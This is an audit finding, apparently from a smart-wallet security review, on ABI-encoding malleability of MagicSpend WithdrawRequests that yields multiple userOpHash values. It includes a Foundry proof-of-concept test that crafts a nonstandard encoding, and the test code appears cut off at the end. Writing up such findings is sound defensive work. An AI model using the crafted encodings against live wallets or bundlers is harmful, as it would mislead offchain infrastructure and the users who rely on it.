Malicious/nonstandard WithdrawalRequest encoding by bundlers, dapps, or frontends result in non-deterministic `userOpHash`s. Since ABI encoding is somewhat loose, encoding the calldata struct in different ways results in multiple possible `userOpHash` values for the same WithdrawalRequest and therefore for the same UserOperation. 

As a result, the hash emitted by the `IEntryPoint.UserOperationEvent()` event can be manipulated to break and confuse offchain infrastructure. This type of confounding attack has been observed in earlier versions of the ERC4337 EntryPoint contract (<v0.6). Since this behavior interferes with multiple moving parts within the account abstraction standard, a very similar issue was expressly escalated to a semi-urgent fix. See the below:

https://github.com/eth-infinitism/account-abstraction/issues/237#issuecomment-1460273542
https://github.com/eth-infinitism/account-abstraction/pull/233#issuecomment-1459155222

While the original behavior was patched in EntryPoint v0.6, the potential for deviation of WithdrawRequest calldata encoding reintroduces similar behavior from higher up the call stack to the app layer (Smart Wallet).

This issue is marked as low/non-critical since it largely affects offchain software and still must be explicitly signed by wallet owners. It is however worth noting that the number of available `userOpHash`s can be compounded by the options to use malleable ECDSA signatures (explicitly allowed by the Solady::SignatureCheckerLib implementation) as well as EIP2098 compact signatures, increasing the chance of collision.

PoC which can be run from a new "PoC" directory like so: `~/project-root/test/PoC/PoC.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {SignatureCheckerLib} from "solady/utils/SignatureCheckerLib.sol";
import {UserOperation, UserOperationLib} from "account-abstraction/interfaces/UserOperation.sol";
import {IStakeManager} from "account-abstraction/interfaces/IStakeManager.sol";
import {calldataKeccak} from "account-abstraction/core/Helpers.sol";
import {MockEntryPoint} from "../mocks/MockEntryPoint.sol";
import "test/MagicSpend/PaymasterMagicSpendBase.sol";
import "../CoinbaseSmartWallet/SmartWalletTestBase.sol";

contract PoC is Test {
    /// forge-config: default.fuzz.runs = 10_000_000

    // dummy event for lazy selector encoding
    event UserOperationEvent(bytes32 indexed userOpHash, address indexed sender, address indexed paymaster, uint256 nonce, bool success, uint256 actualGasCost, uint256 actualGasUsed);

    uint256 msOwnerPrivateKey = 0xdeadbeef;
    address msOwner = vm.addr(msOwnerPrivateKey);
    MagicSpend magicSpend = new MagicSpend(msOwner);
    CoinbaseSmartWallet account = new MockCoinbaseSmartWallet();
    CoinbaseSmartWallet validUserAccount = new MockCoinbaseSmartWallet();
    IEntryPoint entryPoint = IEntryPoint(0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789);

    // userop signature params
    uint256 signerPrivateKey = 0xa11ce;
    address signer = vm.addr(signerPrivateKey);
    uint256 validUserPrivateKey = 0xbeef;
    address validUser = vm.addr(validUserPrivateKey);
    address bundler = vm.addr(0xc0ffeebabe);

    // userop
    uint256 callGasLimit = 49152;
    uint256 verificationGasLimit = 378989;
    uint256 preVerificationGas = 273196043;
    uint256 maxFeePerGas = 1000304;
    uint256 maxPriorityFeePerGas = 1000000;
    
    // withdraw signature params
    address withdrawer = address(0xb0b);
    address asset = address(0x0);
    uint256 amount = 1 ether;
    uint256 maxCost = amount - 10;
    uint256 nonce = 0;
    uint48 expiry = uint48(block.timestamp + 1);

    // to be populated per test
    bytes initCode;
    bytes userOpCalldata;
    bytes paymasterAndData;
    bytes signerSig;
    bytes msOwnerSig;
    bytes[] owners;
    CoinbaseSmartWallet.Call[] calls;

    // baseline storage structs for convenience (update members as needed)
    UserOperation userOp = UserOperation({
        sender: address(account),
        nonce: nonce,
        initCode: initCode,
        callData: userOpCalldata,
        callGasLimit: callGasLimit,
        verificationGasLimit: verificationGasLimit,
        preVerificationGas: preVerificationGas,
        maxFeePerGas: maxFeePerGas,
        maxPriorityFeePerGas: maxPriorityFeePerGas,
        paymasterAndData: paymasterAndData,
        signature: signerSig // empty; must be populated per test
    });
    
    MagicSpend.WithdrawRequest withdrawRequest = MagicSpend.WithdrawRequest({
        asset: asset,
        amount: amount,
        nonce: nonce,
        expiry: expiry,
        signature: msOwnerSig // empty; must be populated per test
    });

    function setUp() public virtual {
        vm.etch(0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789, Static.ENTRY_POINT_BYTES);
        
        vm.deal(address(account), 1 ether);
        vm.deal(address(validUserAccount), 2 ether);
    }

function test_nonDeterministicHashesViaMaliciousWithdrawalEncoding() public {
        _initializeSmartWallet(signer, account);
        _initializeSmartWallet(validUser, validUserAccount);

        // standard ABI encoding
        MagicSpend.WithdrawRequest memory request = withdrawRequest;
        bytes32 requestHash = magicSpend.getHash(address(validUserAccount), request);
        (uint8 reqV, bytes32 reqR, bytes32 reqS) = vm.sign(msOwnerPrivateKey, requestHash);
        request.signature = abi.encodePacked(reqR, reqS, reqV);

        // malicious encoding (ABI-recognizable)
        // note first _craftMaliciousRequest uses previous (incorrect) sig just for slot encoding alignment
        bytes memory unsignedMaliciousRequest = _craftMaliciousRequest(amount, nonce, reqR, reqS, reqV, expiry, true, false);
        // abi can decode maliciousRequest
        MagicSpend.WithdrawRequest memory mal = abi.decode(unsignedMaliciousRequest, (MagicSpend.WithdrawRequest));

        bytes32 maliciousHash = magicSpend.getHash(address(validUserAccount), mal);
        // prove non-deterministic WithdrawRequest hashes
        assertNotEq(maliciousHash, requestHash);
        
        // populate mal with updated signature payload signed on new hash
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(msOwnerPrivateKey, maliciousHash);
        bytes memory maliciousRequest = _craftMaliciousRequest(amount, nonce, r, s, v, expiry, true, false);

        // prove non-deterministic UserOp hashes
        (, bytes32 opHash) = _getValidUserOpSigned(abi.encodePacked(address(magicSpend), abi.encode(request)));
        (, bytes32 malOpHash) = _getValidUserOpSigned(abi.encodePacked(address(magicSpend), maliciousRequest));
        assertNotEq(opHash, malOpHash); 

        console2.logString('expected userOpHash:');
        console2.logBytes32(opHash);
        console2.logString('actual userOpHash:');
        console2.logBytes32(malOpHash);
        console2.logString('each new encoding produces multiple potential userOpHashes and even more valid signatures');
    }

function _craftMaliciousRequest(
        uint256 amt, 
        uint256 nonce, 
        bytes32 r, 
        bytes32 s, 
        uint8 v, 
        uint48 /*expiry*/, 
        bool packExpiry,
        bool compactSig2098
    ) internal pure returns (bytes memory) {
        // impl not necessary for PoC as non-determinism of `WithdrawRequest` hash & therefore `userOpHash` is proven but for example:
        if (!packExpiry) { /* use unpacked uint8 V & expiry */ }
        
        // further unique `WithdrawRequest` encodings lead to more permutations of `userOpHash` and request hash
        if (compactSig2098) { 
            // use 64 byte signature as opposed to 65 byte
            s = _convertTo2098CompactSig(s, v);
        }

        return abi.encodePacked(
            uint256(0x20), // start ofs
            uint256(0x80), // sig ofs
            uint256(uint160(address(0x0))), // asset
            amt, // amount (== 1 ether)
            nonce, // nonce (== 0)
            uint256(0x41), // sig len
            uint256(r), // sig R
            uint256(s), // sig S
            uint256(bytes32(bytes1(v))) | uint256(uint48(0x02))  // packed sig V & expiry
            // uint256(uint48(0x02)) // example optional unpacked expiry slot (prev slot would be sig V only)
        );
    }

    function _convertTo2098CompactSig(bytes32 s, uint8 v) internal pure returns (bytes32 newS) {
        // create EIP2098 compact signature by eliminating `v` and encoding the ECDSA yParity into topmost bit of `s`
        newS = v == 28 ? bytes32(uint256(s) + (8 << 252)) : s;
    }

    function _initializeSmartWallet(address owner, CoinbaseSmartWallet target) internal {
        delete owners;
        owners.push(abi.encode(owner));
        target.initialize(owners);
    }

    function _getValidUserOpSigned(bytes memory _paymasterAndData) internal view returns (UserOperation memory validOp, bytes32 retOpHash) {
        // populate valid userOp fields using storage struct
        validOp = userOp;
        validOp.sender = address(validUserAccount);
        validOp.paymasterAndData = _paymasterAndData;

        // populate valid userOp signature
        retOpHash = entryPoint.getUserOpHash(validOp);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validUserPrivateKey, retOpHash);
        bytes memory sig = abi.encodePacked(r, s, v);
        validOp.signature = abi.encode(CoinbaseSmartWallet.SignatureWrapper(0, sig));
    }
```


